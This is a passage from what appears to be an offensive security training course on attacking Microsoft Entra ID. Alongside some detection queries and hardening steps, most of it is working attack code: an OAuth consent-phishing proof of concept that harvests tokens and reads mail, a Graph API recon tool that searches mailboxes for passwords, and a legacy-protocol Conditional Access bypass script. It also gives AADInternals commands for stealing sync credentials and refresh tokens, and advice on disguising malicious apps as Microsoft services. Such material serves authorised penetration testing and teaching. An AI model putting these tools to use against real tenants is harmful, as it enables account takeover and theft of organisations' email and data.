OperationName == \"Consent to application\"\n| where ResultStatus == \"success\"\n| extend AppDisplayName = tostring(parse_json(TargetResources)[0].displayName)\n| extend Permissions = tostring(parse_json(TargetResources)[0].modifiedProperties)\n| project TimeGenerated, UserPrincipalName, AppDisplayName, Permissions, IPAddress\n| order by TimeGenerated desc\n```\n\n**2. Detect Anomalous Graph API Usage**\n\n```kql\nSigninLogs\n| where ResourceDisplayName == \"Microsoft Graph\"\n| where ResultType == 0\n| summarize Count=count() by UserPrincipalName, IPAddress, bin(TimeGenerated, 1h)\n| where Count > 1000  // Excessive API calls\n```\n\n**3. Monitor Token Usage from Unexpected Locations**\n\n```kql\nSigninLogs\n| where ResultType == 0\n| extend LocationChange = iff(Location != prev(Location), 1, 0)\n| where LocationChange == 1\n| where TimeGenerated - prev(TimeGenerated) < 5m  // Impossible travel\n```\n\n### Hardening Measures\n\n**1. Disable User Consent for Applications**\n\n```powershell\n# Require admin approval for all OAuth apps\nUpdate-MgPolicyAuthorizationPolicy -PermissionGrantPolicyIdsAssignedToDefaultUserRole @()\n```\n\n**2. Enable Conditional Access Policies**\n\n```powershell\n# Require MFA for all users\nNew-AzureADMSConditionalAccessPolicy `\n  -DisplayName \"Require MFA for all users\" `\n  -State \"Enabled\" `\n  -Conditions $conditions `\n  -GrantControls $grantControls\n```\n\n**3. Disable Legacy Authentication**\n\n```powershell\n# Block legacy auth protocols\nSet-OrganizationConfig -OAuth2ClientProfileEnabled $false\n```\n\n**4. Implement Token Protection**\n\n```powershell\n# Enable Continuous Access Evaluation (CAE)\n# Tokens are re-evaluated in real-time for critical events\nUpdate-MgPolicyAuthorizationPolicy -EnableContinuousAccessEvaluation $true\n```\n\n**5. Monitor High-Risk Permissions**\n\nAudit applications with these dangerous permissions:\n- `Mail.ReadWrite.All`\n- `Files.ReadWrite.All`\n- `User.ReadWrite.All`\n- `Group.ReadWrite.All`\n- `Directory.ReadWrite.All`\n\n## Summary\n\nYou've mastered the core attack techniques against Microsoft Entra ID:\n\nâœ… **OAuth/OIDC Fundamentals**: Token flows, JWT structure\nâœ… **Illicit Consent Grants**: Phishing users to authorize malicious apps\nâœ… **Microsoft Graph API**: Reconnaissance, data exfiltration, privilege escalation\nâœ… **Conditional Access Bypass**: Token theft, legacy protocols, device code flow\nâœ… **PRT Theft**: Persistent, MFA-bypassing access\n\n**Key Takeaway**: Cloud identity is the new perimeter. Master Entra ID attacks, and you master cloud security."
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Hands-On Exercise: Attacking Microsoft Entra ID\n\n## Exercise 1: OAuth Consent Grant Simulation\n\n**Goal**: Create a proof-of-concept OAuth application that demonstrates consent grant attacks.\n\n### Step 1: Register Application in Azure AD\n\n```bash\n# Using Azure CLI\naz login\n\n# Register application\naz ad app create \\\n  --display-name \"File Sync Tool (POC)\" \\\n  --sign-in-audience \"AzureADMyOrg\" \\\n  --web-redirect-uris \"http://localhost:8000/callback\"\n\n# Note the Application (client) ID from output\n```\n\n### Step 2: Configure API Permissions\n\n```bash\n# Add delegated permissions\naz ad app permission add \\\n  --id {app-id} \\\n  --api 00000003-0000-0000-c000-000000000000 \\\n  --api-permissions \\\n    e1fe6dd8-ba31-4d61-89e7-88639da4683d=Scope \\\n    570282fd-fa5c-430d-a7fd-fc8dc98a9dca=Scope\n\n# Permission IDs:\n# e1fe6dd8... = User.Read\n# 570282fd... = Mail.ReadWrite\n```\n\n### Step 3: Create Authorization URL\n\n```python\n#!/usr/bin/env python3\n# oauth_consent_poc.py\n\nimport urllib.parse\nimport secrets\n\n# Configuration\nTENANT_ID = \"your-tenant-id\"\nCLIENT_ID = \"your-client-id\"\nREDIRECT_URI = \"http://localhost:8000/callback\"\n\n# Generate state token (CSRF protection)\nstate = secrets.token_urlsafe(32)\n\n# OAuth authorization endpoint\nauth_url = \"https://login.microsoftonline.com/{}/oauth2/v2.0/authorize\".format(TENANT_ID)\n\n# Parameters\nparams = {\n    \"client_id\": CLIENT_ID,\n    \"response_type\": \"code\",\n    \"redirect_uri\": REDIRECT_URI,\n    \"response_mode\": \"query\",\n    \"scope\": \"openid profile email User.Read Mail.ReadWrite offline_access\",\n    \"state\": state\n}\n\n# Build authorization URL\nauth_request = auth_url + \"?\" + urllib.parse.urlencode(params)\n\nprint(\"[*] OAuth Consent Grant POC\")\nprint(\"[*] Authorization URL:\")\nprint()\nprint(auth_request)\nprint()\nprint(\"[*] Open this URL in a browser to see the consent screen\")\nprint(\"[*] Note the permissions requested (this simulates a malicious app)\")\nprint()\nprint(\"[!] For demonstration only - do not use on unauthorized systems\")\n```\n\n**Run the script:**\n```bash\npython3 oauth_consent_poc.py\n```\n\n### Step 4: Implement Callback Handler\n\n```python\n#!/usr/bin/env python3\n# oauth_callback_server.py\n\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nimport urllib.parse\nimport requests\nimport json\n\nCLIENT_ID = \"your-client-id\"\nCLIENT_SECRET = \"your-client-secret\"\nTENANT_ID = \"your-tenant-id\"\nREDIRECT_URI = \"http://localhost:8000/callback\"\n\nclass CallbackHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        # Parse callback URL\n        parsed = urllib.parse.urlparse(self.path)\n        params = urllib.parse.parse_qs(parsed.query)\n        \n        if 'code' in params:\n            auth_code = params['code'][0]\n            \n            print(f\"[+] Received authorization code: {auth_code[:50]}...\")\n            \n            # Exchange code for tokens\n            token_url = f\"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token\"\n            \n            token_data = {\n                \"client_id\": CLIENT_ID,\n                \"scope\": \"User.Read Mail.ReadWrite\",\n                \"code\": auth_code,\n                \"redirect_uri\": REDIRECT_URI,\n                \"grant_type\": \"authorization_code\",\n                \"client_secret\": CLIENT_SECRET\n            }\n            \n            response = requests.post(token_url, data=token_data)\n            tokens = response.json()\n            \n            if 'access_token' in tokens:\n                print(\"[+] Successfully obtained tokens!\")\n                print(f\"[+] Access Token: {tokens['access_token'][:50]}...\")\n                \n                # Test token with Graph API\n                self.test_graph_api(tokens['access_token'])\n                \n                self.send_response(200)\n                self.send_header('Content-type', 'text/html')\n                self.end_headers()\n                self.wfile.write(b\"<h1>Success! Check your terminal for token details.</h1>\")\n            else:\n                print(f\"[!] Error: {tokens}\")\n                self.send_response(400)\n                self.end_headers()\n        else:\n            self.send_response(400)\n            self.end_headers()\n    \n    def test_graph_api(self, access_token):\n        \"\"\"Test the access token with Microsoft Graph API\"\"\"\n        print(\"\\n[*] Testing token with Microsoft Graph API...\")\n        \n        headers = {\"Authorization\": f\"Bearer {access_token}\"}\n        \n        # Get user profile\n        response = requests.get(\"https://graph.microsoft.com/v1.0/me\", headers=headers)\n        if response.status_code == 200:\n            user = response.json()\n            print(f\"[+] User: {user.get('displayName')} ({user.get('userPrincipalName')})\")\n        \n        # Get recent emails\n        response = requests.get(\"https://graph.microsoft.com/v1.0/me/messages?$top=5\", headers=headers)\n        if response.status_code == 200:\n            messages = response.json()['value']\n            print(f\"[+] Found {len(messages)} recent emails\")\n            for msg in messages:\n                print(f\"    - {msg.get('subject', 'No subject')}\")\n    \n    def log_message(self, format, *args):\n        pass  # Suppress default logging\n\nif __name__ == \"__main__\":\n    print(\"[*] Starting OAuth callback server on http://localhost:8000\")\n    print(\"[*] Waiting for authorization callback...\")\n    server = HTTPServer(('localhost', 8000), CallbackHandler)\n    server.handle_request()  # Handle one request then exit\n```\n\n**Run the callback server:**\n```bash\npython3 oauth_callback_server.py\n```\n\n## Exercise 2: Microsoft Graph API Reconnaissance\n\n**Goal**: Use Graph API to enumerate users, groups, and applications.\n\n```python\n#!/usr/bin/env python3\n# graph_recon.py\n\nimport requests\nimport json\nimport sys\n\ndef graph_request(endpoint, access_token):\n    \"\"\"Make authenticated request to Microsoft Graph API\"\"\"\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n    response = requests.get(f\"https://graph.microsoft.com/v1.0/{endpoint}\", headers=headers)\n    \n    if response.status_code == 200:\n        return response.json()\n    else:\n        print(f\"[!] Error {response.status_code}: {response.text}\")\n        return None\n\ndef enumerate_users(access_token):\n    \"\"\"Enumerate all users in the tenant\"\"\"\n    print(\"\\n[*] Enumerating users...\")\n    \n    data = graph_request(\"users?$select=displayName,userPrincipalName,jobTitle,department,mail\", access_token)\n    \n    if data and 'value' in data:\n        users = data['value']\n        print(f\"[+] Found {len(users)} users\")\n        \n        # Group by department\n        departments = {}\n        for user in users:\n            dept = user.get('department', 'Unknown')\n            if dept not in departments:\n                departments[dept] = []\n            departments[dept].append(user)\n        \n        print(\"\\n[*] Users by department:\")\n        for dept, dept_users in departments.items():\n            print(f\"\\n  {dept} ({len(dept_users)} users):\")\n            for user in dept_users[:5]:  # Show first 5\n                print(f\"    - {user.get('displayName', 'N/A')} ({user.get('jobTitle', 'N/A')})\")\n            if len(dept_users) > 5:\n                print(f\"    ... and {len(dept_users)-5} more\")\n\ndef enumerate_groups(access_token):\n    \"\"\"Enumerate all groups\"\"\"\n    print(\"\\n[*] Enumerating groups...\")\n    \n    data = graph_request(\"groups?$select=displayName,description,groupTypes\", access_token)\n    \n    if data and 'value' in data:\n        groups = data['value']\n        print(f\"[+] Found {len(groups)} groups\")\n        \n        # Identify admin groups\n        admin_keywords = ['admin', 'privileged', 'elevated', 'domain']\n        admin_groups = [g for g in groups if any(kw in g.get('displayName', '').lower() for kw in admin_keywords)]\n        \n        if admin_groups:\n            print(\"\\n[!] Potential admin groups:\")\n            for group in admin_groups:\n                print(f\"    - {group.get('displayName')}\")\n\ndef enumerate_applications(access_token):\n    \"\"\"Enumerate registered applications\"\"\"\n    print(\"\\n[*] Enumerating applications...\")\n    \n    data = graph_request(\"applications?$select=displayName,appId,createdDateTime\", access_token)\n    \n    if data and 'value' in data:\n        apps = data['value']\n        print(f\"[+] Found {len(apps)} registered applications\")\n        \n        for app in apps[:10]:  # Show first 10\n            print(f\"    - {app.get('displayName')} (created: {app.get('createdDateTime', 'N/A')})\")\n\ndef enumerate_service_principals(access_token):\n    \"\"\"Enumerate service principals (enterprise apps)\"\"\"\n    print(\"\\n[*] Enumerating service principals...\")\n    \n    data = graph_request(\"servicePrincipals?$select=displayName,appId,servicePrincipalType\", access_token)\n    \n    if data and 'value' in data:\n        sps = data['value']\n        print(f\"[+] Found {len(sps)} service principals\")\n        \n        # Filter for custom apps\n        custom_sps = [sp for sp in sps if sp.get('servicePrincipalType') == 'Application']\n        print(f\"[+] Custom applications: {len(custom_sps)}\")\n\ndef search_emails(access_token, keyword):\n    \"\"\"Search emails for specific keywords\"\"\"\n    print(f\"\\n[*] Searching emails for keyword: '{keyword}'\")\n    \n    data = graph_request(f\"me/messages?$search=\\\"{keyword}\\\"&$top=10\", access_token)\n    \n    if data and 'value' in data:\n        messages = data['value']\n        print(f\"[+] Found {len(messages)} emails matching '{keyword}'\")\n        \n        for msg in messages:\n            print(f\"\\n  Subject: {msg.get('subject', 'No subject')}\")\n            print(f\"  From: {msg.get('from', {}).get('emailAddress', {}).get('address', 'Unknown')}\")\n            print(f\"  Date: {msg.get('receivedDateTime', 'Unknown')}\")\n            print(f\"  Preview: {msg.get('bodyPreview', '')[:100]}...\")\n\ndef main():\n    if len(sys.argv) < 2:\n        print(\"Usage: python3 graph_recon.py <access_token>\")\n        print(\"\\nOptional: python3 graph_recon.py <access_token> <search_keyword>\")\n        sys.exit(1)\n    \n    access_token = sys.argv[1]\n    \n    print(\"=\"*60)\n    print(\"Microsoft Graph API Reconnaissance Tool\")\n    print(\"=\"*60)\n    \n    # Get current user info\n    print(\"\\n[*] Authenticating...\")\n    me = graph_request(\"me\", access_token)\n    if me:\n        print(f\"[+] Authenticated as: {me.get('displayName')} ({me.get('userPrincipalName')})\")\n    else:\n        print(\"[!] Invalid or expired access token\")\n        sys.exit(1)\n    \n    # Perform reconnaissance\n    enumerate_users(access_token)\n    enumerate_groups(access_token)\n    enumerate_applications(access_token)\n    enumerate_service_principals(access_token)\n    \n    # Search emails if keyword provided\n    if len(sys.argv) > 2:\n        keyword = sys.argv[2]\n        search_emails(access_token, keyword)\n    \n    print(\"\\n\" + \"=\"*60)\n    print(\"Reconnaissance complete!\")\n    print(\"=\"*60)\n\nif __name__ == \"__main__\":\n    main()\n```\n\n**Usage:**\n```bash\n# Basic reconnaissance\npython3 graph_recon.py \"eyJ0eXAiOiJKV1QiLCJhbGc...\"\n\n# With email search\npython3 graph_recon.py \"eyJ0eXAiOiJKV1QiLCJhbGc...\" \"password\"\n```\n\n## Exercise 3: JWT Token Analysis\n\n**Goal**: Decode and analyze Azure AD JWT tokens.\n\n```python\n#!/usr/bin/env python3\n# jwt_analyzer.py\n\nimport base64\nimport json\nimport sys\nfrom datetime import datetime\n\ndef decode_jwt(token):\n    \"\"\"Decode JWT token (without validation)\"\"\"\n    parts = token.split('.')\n    \n    if len(parts) != 3:\n        print(\"[!] Invalid JWT format\")\n        return None\n    \n    # Decode header\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    \n    # Decode payload\n    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))\n    \n    return header, payload\n\ndef analyze_token(token):\n    \"\"\"Analyze Azure AD access token\"\"\"\n    print(\"=\"*60)\n    print(\"Azure AD JWT Token Analyzer\")\n    print(\"=\"*60)\n    \n    result = decode_jwt(token)\n    if not result:\n        return\n    \n    header, payload = result\n    \n    # Header analysis\n    print(\"\\n[*] Token Header:\")\n    print(f\"  Algorithm: {header.get('alg', 'Unknown')}\")\n    print(f\"  Type: {header.get('typ', 'Unknown')}\")\n    print(f\"  Key ID: {header.get('kid', 'Unknown')}\")\n    \n    # Payload analysis\n    print(\"\\n[*] Token Claims:\")\n    \n    # User info\n    if 'upn' in payload:\n        print(f\"\\n  User Principal Name: {payload['upn']}\")\n    if 'name' in payload:\n        print(f\"  Display Name: {payload['name']}\")\n    if 'unique_name' in payload:\n        print(f\"  Unique Name: {payload['unique_name']}\")\n    \n    # Token metadata\n    print(f\"\\n  Issuer: {payload.get('iss', 'Unknown')}\")\n    print(f\"  Audience: {payload.get('aud', 'Unknown')}\")\n    print(f\"  Application ID: {payload.get('appid', 'Unknown')}\")\n    \n    if 'app_displayname' in payload:\n        print(f\"  Application Name: {payload['app_displayname']}\")\n    \n    # Timestamps\n    if 'iat' in payload:\n        iat = datetime.fromtimestamp(payload['iat'])\n        print(f\"\\n  Issued At: {iat}\")\n    \n    if 'exp' in payload:\n        exp = datetime.fromtimestamp(payload['exp'])\n        now = datetime.now()\n        print(f\"  Expires At: {exp}\")\n        \n        if exp > now:\n            remaining = (exp - now).total_seconds() / 60\n            print(f\"  [+] Token is VALID (expires in {remaining:.0f} minutes)\")\n        else:\n            print(f\"  [!] Token is EXPIRED\")\n    \n    # Permissions (scopes)\n    if 'scp' in payload:\n        scopes = payload['scp'].split(' ')\n        print(f\"\\n  Delegated Permissions (scp):\")\n        for scope in scopes:\n            risk_level = assess_permission_risk(scope)\n            print(f\"    - {scope} {risk_level}\")\n    \n    if 'roles' in payload:\n        roles = payload['roles']\n        print(f\"\\n  Application Permissions (roles):\")\n        for role in roles:\n            risk_level = assess_permission_risk(role)\n            print(f\"    - {role} {risk_level}\")\n    \n    # Tenant info\n    if 'tid' in payload:\n        print(f\"\\n  Tenant ID: {payload['tid']}\")\n    \n    # Full payload (for advanced analysis)\n    print(\"\\n[*] Full Payload (JSON):\")\n    print(json.dumps(payload, indent=2))\n\ndef assess_permission_risk(permission):\n    \"\"\"Assess risk level of a permission\"\"\"\n    high_risk = ['Mail.ReadWrite.All', 'Files.ReadWrite.All', 'User.ReadWrite.All', \n                 'Group.ReadWrite.All', 'Directory.ReadWrite.All', 'RoleManagement.ReadWrite.Directory']\n    medium_risk = ['Mail.Read', 'Files.Read', 'User.Read.All', 'offline_access']\n    \n    if any(hr in permission for hr in high_risk):\n        return \"[!] HIGH RISK\"\n    elif any(mr in permission for mr in medium_risk):\n        return \"[~] MEDIUM RISK\"\n    else:\n        return \"[+] LOW RISK\"\n\nif __name__ == \"__main__\":\n    if len(sys.argv) < 2:\n        print(\"Usage: python3 jwt_analyzer.py <jwt_token>\")\n        sys.exit(1)\n    \n    token = sys.argv[1]\n    analyze_token(token)\n```\n\n**Usage:**\n```bash\npython3 jwt_analyzer.py \"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6...\"\n```\n\n## Exercise 4: Conditional Access Bypass Testing\n\n**Scenario**: Test if Conditional Access policies can be bypassed using legacy protocols.\n\n```bash\n#!/bin/bash\n# ca_bypass_test.sh - Test legacy protocol access\n\nUSER=\"$1\"\nPASS=\"$2\"\n\nif [ -z \"$USER\" ] || [ -z \"$PASS\" ]; then\n    echo \"Usage: $0 <user@domain.com> <password>\"\n    exit 1\nfi\n\necho \"[*] Testing Conditional Access Bypass Techniques\"\necho \"[*] Target: $USER\"\necho \"\"\n\n# Test 1: IMAP (legacy protocol)\necho \"[1/4] Testing IMAP access...\"\nRESULT=$(timeout 10 openssl s_client -connect outlook.office365.com:993 -quiet 2>/dev/null <<EOF\nA1 LOGIN $USER $PASS\nA2 LIST \"\" \"*\"\nA3 LOGOUT\nEOF\n)\n\nif echo \"$RESULT\" | grep -q \"A1 OK\"; then\n    echo \"  [!] SUCCESS: IMAP access granted (CA likely bypassed)\"\nelse\n    echo \"  [+] BLOCKED: IMAP access denied (CA working or legacy auth disabled)\"\nfi\n\n# Test 2: POP3 (legacy protocol)\necho \"\\n[2/4] Testing POP3 access...\"\nRESULT=$(timeout 10 openssl s_client -connect outlook.office365.com:995 -quiet 2>/dev/null <<EOF\nUSER $USER\nPASS $PASS\nSTAT\nQUIT\nEOF\n)\n\nif echo \"$RESULT\" | grep -q \"+OK\"; then\n    echo \"  [!] SUCCESS: POP3 access granted (CA likely bypassed)\"\nelse\n    echo \"  [+] BLOCKED: POP3 access denied\"\nfi\n\n# Test 3: SMTP (legacy protocol)\necho \"\\n[3/4] Testing SMTP AUTH...\"\nRESULT=$(timeout 10 openssl s_client -connect smtp.office365.com:587 -starttls smtp -quiet 2>/dev/null <<EOF\nAUTH LOGIN\n$(echo -n $USER | base64)\n$(echo -n $PASS | base64)\nQUIT\nEOF\n)\n\nif echo \"$RESULT\" | grep -q \"235\"; then\n    echo \"  [!] SUCCESS: SMTP authentication succeeded (CA likely bypassed)\"\nelse\n    echo \"  [+] BLOCKED: SMTP authentication failed\"\nfi\n\n# Test 4: EWS (Exchange Web Services)\necho \"\\n[4/4] Testing EWS access...\"\ncurl -s -u \"$USER:$PASS\" \\\n  -H \"Content-Type: text/xml\" \\\n  -d '<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <ResolveNames xmlns=\"http://schemas.microsoft.com/exchange/services/2006/messages\">\n      <UnresolvedEntry>test</UnresolvedEntry>\n    </ResolveNames>\n  </soap:Body>\n</soap:Envelope>' \\\n  https://outlook.office365.com/EWS/Exchange.asmx \\\n  -w \"HTTP_CODE:%{http_code}\\n\" | grep \"HTTP_CODE\"\n\nif [ $? -eq 0 ]; then\n    echo \"  [!] EWS endpoint accessible\"\nelse\n    echo \"  [+] EWS endpoint blocked\"\nfi\n\necho \"\"\necho \"[*] Test complete. If any tests succeeded, Conditional Access may be bypassable.\"\necho \"[*] Recommendation: Disable legacy authentication protocols.\"\n```\n\n**Run the test:**\n```bash\nchmod +x ca_bypass_test.sh\n./ca_bypass_test.sh user@company.com P@ssw0rd123\n```\n\n## Challenge Exercise: Full Attack Chain\n\n**Objective**: Chain multiple techniques together for a complete attack simulation.\n\n**Attack Chain:**\n1. Create malicious OAuth app\n2. Phish user for consent\n3. Obtain access token\n4. Use Graph API for reconnaissance\n5. Exfiltrate emails with sensitive keywords\n6. Attempt privilege escalation\n7. Establish persistence\n\n**Your Task**: Implement this attack chain using the tools and techniques from this lesson.\n\n**Note**: Only perform this on your own test tenant or authorized penetration testing engagements!\n\nThese exercises give you hands-on experience with real Entra ID attack techniques. Practice responsibly!"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "# Real-World Entra ID Attacks: Case Studies\n\n## Case Study 1: SolarWinds / Midnight Blizzard (2020-2021)\n\n### The Most Sophisticated Cloud Attack in History\n\n**Attacker**: APT29 / Nobelium (Russian state-sponsored)\n**Target**: 18,000+ organizations (US government agencies, Fortune 500 companies)\n**Entry Point**: Compromised SolarWinds Orion software updates\n**Crown Jewel**: Microsoft and US government Azure AD tenants\n\n### Attack Timeline\n\n**Phase 1: Initial Compromise (March 2020)**\n\n1. APT29 compromised SolarWinds build servers\n2. Injected malicious code (SUNBURST backdoor) into Orion software\n3. Signed malicious updates with legitimate SolarWinds certificates\n4. 18,000 organizations downloaded trojanized updates\n\n**Phase 2: Azure AD Compromise (May-December 2020)**\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚        APT29 Azure AD Attack Chain                  â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                                      â”‚\nâ”‚ 1. SUNBURST backdoor â†’ initial foothold            â”‚\nâ”‚ 2. Steal on-premises AD credentials                â”‚\nâ”‚ 3. Enumerate Azure AD Connect servers              â”‚\nâ”‚ 4. Extract MSOL account credentials                â”‚\nâ”‚ 5. Authenticate to Azure AD as sync account        â”‚\nâ”‚ 6. Create malicious OAuth applications             â”‚\nâ”‚ 7. Grant applications excessive permissions        â”‚\nâ”‚ 8. Use service principal tokens (bypasses MFA)     â”‚\nâ”‚ 9. Access victim M365 mailboxes via Graph API      â”‚\nâ”‚ 10. Exfiltrate emails from senior leadership       â”‚\nâ”‚                                                      â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n**Key Technique: Compromising Azure AD Connect**\n\nAzure AD Connect synchronizes on-premises AD with Azure AD:\n\n```powershell\n# APT29 extracted the MSOL account password from Azure AD Connect\n# This account has Directory.ReadWrite.All permissions\n\n# Command used (via AADInternals):\nGet-AADIntSyncCredentials\n\n# Output:\n# UserName: Sync_SERVER_1234567890ab@company.onmicrosoft.com\n# Password: VeryLongRandomPassword123!\n# Permissions: Directory.ReadWrite.All (full tenant access)\n```\n\n**OAuth Application Abuse:**\n\n```bash\n# APT29 created OAuth apps with names mimicking legitimate services:\n# - \"Microsoft Defender ATP\"\n# - \"Microsoft Intune\"\n# - \"Azure Security Center\"\n\n# Each app was granted:\nMail.ReadWrite.All         # Read all emails\nFiles.ReadWrite.All        # Access all files\nContacts.ReadWrite.All     # Access contacts\nUser.Read.All              # Enumerate all users\n```\n\n**Impact at Microsoft:**\n\n- APT29 accessed Microsoft corporate email accounts\n- Exfiltrated source code from internal repositories\n- Read executive communications\n- Maintained access for 9+ months undetected\n- Microsoft disclosure (December 31, 2020): \"Viewed source code\"\n\n**Detection Challenges:**\n\n1. **Legitimate credentials used**: MSOL account is supposed to have high privileges\n2. **API-based access**: No malware on endpoints, only API calls\n3. **Slow and low**: Attackers used realistic access patterns\n4. **Signed code**: SUNBURST was digitally signed by SolarWinds\n\n### Lessons for Penetration Testers\n\n**Target Azure AD Connect Servers:**\n\n```powershell\n# Locate Azure AD Connect servers\nGet-ADComputer -Filter {Name -like \"*SYNC*\" -or Name -like \"*AADConnect*\"}\n\n# If you compromise one, extract MSOL credentials:\nImport-Module AADInternals\n$creds = Get-AADIntSyncCredentials\n\n# Use these credentials for full tenant access\nConnect-AzureAD -Credential $creds\n```\n\n**Create Stealthy OAuth Apps:**\n\n```powershell\n# Mimic legitimate Microsoft service names\nNew-AzureADApplication -DisplayName \"Microsoft Intune Device Management\" `\n  -AvailableToOtherTenants $false\n\n# Request permissions that blend in\n# Avoid requesting ALL permissions at once\n# Request incrementally over time\n```\n\n---\n\n## Case Study 2: Lapsus$ Rampage (2022)\n\n### The Teenage Hackers Who Breached Microsoft, Nvidia, Okta\n\n**Attackers**: Lapsus$ (extortion group, 16-21 years old)\n**Targets**: Microsoft, Nvidia, Okta, Samsung, Ubisoft, T-Mobile\n**Primary Technique**: Social engineering + Azure AD exploitation\n**Motive**: Extortion and notoriety\n\n### Attack Methodology\n\n**Phase 1: Initial Access via Social Engineering**\n\n**Technique 1: SIM Swapping**\n```\n1. Identify high-value target (employee at target company)\n2. Social engineer mobile carrier to port victim's phone number\n3. Receive MFA codes sent via SMS\n4. Authenticate to VPN/Azure AD\n```\n\n**Technique 2: Insider Recruitment**\n```\n1. Identify disgruntled employees on Dark Web forums\n2. Pay insiders for credentials ($10k-$50k)\n3. Use provided credentials for initial access\n4. Escalate privileges from there\n```\n\n**Technique 3: Credential Purchasing**\n```\n1. Buy stolen credentials from initial access brokers\n2. Test credentials against target's Azure AD\n3. If MFA required, use SIM swap or push bombing\n4. Gain authenticated access\n```\n\n**Phase 2: MFA Bypass via Push Bombing**\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚         Push Bombing Attack Flow               â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                                 â”‚\nâ”‚ 1. Attacker has valid username/password        â”‚\nâ”‚ 2. Attempts login â†’ triggers MFA push          â”‚\nâ”‚ 3. User's phone: \"Approve login? [Deny/Approve]\" â”‚\nâ”‚ 4. User denies (realizes it's not them)        â”‚\nâ”‚ 5. Attacker tries again... and again... 50x    â”‚\nâ”‚ 6. User gets fatigued, accidentally approves   â”‚\nâ”‚ 7. OR user calls IT: \"Why am I getting spammed?\" â”‚\nâ”‚ 8. Social engineer poses as IT: \"Approve it\"   â”‚\nâ”‚ 9. User approves â†’ attacker authenticated!     â”‚\nâ”‚                                                 â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n**Real Victim Quote** (Microsoft employee):\n> \"I kept getting push notifications to approve login. After the 40th one at 2 AM, I just hit approve so I could sleep.\"\n\n**Phase 3: Primary Refresh Token (PRT) Extraction**\n\nOnce authenticated to VPN, Lapsus$ accessed Azure AD-joined machines:\n\n```powershell\n# Extract PRT from compromised device\nImport-Module AADInternals\n$prt = Get-AADIntPRT\n\n# PRT provides:\n# - 90-day validity\n# - Access to ALL Azure AD apps\n# - NO additional MFA prompts\n# - Survives password resets\n```\n\n**Phase 4: Lateral Movement and Data Exfiltration**\n\n```powershell\n# Use PRT to request access tokens for any app\n$token = Get-AADIntAccessTokenForMSGraph -PRTToken $prt\n\n# Enumerate repositories\nInvoke-RestMethod -Uri \"https://dev.azure.com/{org}/_apis/projects\" `\n  -Headers @{Authorization=\"Bearer $token\"}\n\n# Clone all source code repositories\ngit clone https://{token}@dev.azure.com/{org}/{project}/_git/{repo}\n\n# Search for secrets in code\ntruffleHog --regex ./cloned_repos/\n```\n\n**Impact:**\n\n**Microsoft (March 2022)**:\n- Accessed Azure DevOps repositories\n- Downloaded 37GB of Bing Maps and Cortana source code\n- Leaked source code on Telegram\n- Microsoft confirmed: \"One account compromised\"\n\n**Nvidia (February 2022)**:\n- Stole 1TB of proprietary data\n- GPU schematics, driver source code, employee credentials\n- Demanded Nvidia remove cryptocurrency mining limits\n\n**Okta (March 2022)**:\n- Compromised Okta support engineer's laptop\n- Accessed Okta customer admin portals\n- Viewed customer configurations and secrets\n- 366 customers potentially affected\n\n### Defensive Takeaways\n\n**1. MFA Fatigue Prevention:**\n\n```powershell\n# Implement number matching (not just push)\n# User must enter number shown on login screen\n\n# In Azure AD Conditional Access:\n# - Enable \"Require number matching\" for authenticator\n# - Limit push notification frequency (max 3/hour)\n```\n\n**2. Monitor for Repeated MFA Prompts:**\n\n```kql\n// Azure Sentinel query for MFA bombing\nSigninLogs\n| where ResultType != 0  // Failed sign-ins\n| where Status.failureReason contains \"User declined\"\n| summarize FailedAttempts=count() by UserPrincipalName, IPAddress, bin(TimeGenerated, 5m)\n| where FailedAttempts > 10  // More than 10 denials in 5 minutes\n| project TimeGenerated, UserPrincipalName, IPAddress, FailedAttempts\n```\n\n**3. PRT Protection:**\n\n```powershell\n# Require compliant devices\nNew-AzureADMSConditionalAccessPolicy `\n  -DisplayName \"Require Compliant Device\" `\n  -State \"Enabled\" `\n  -Conditions $conditions `\n  -GrantControls 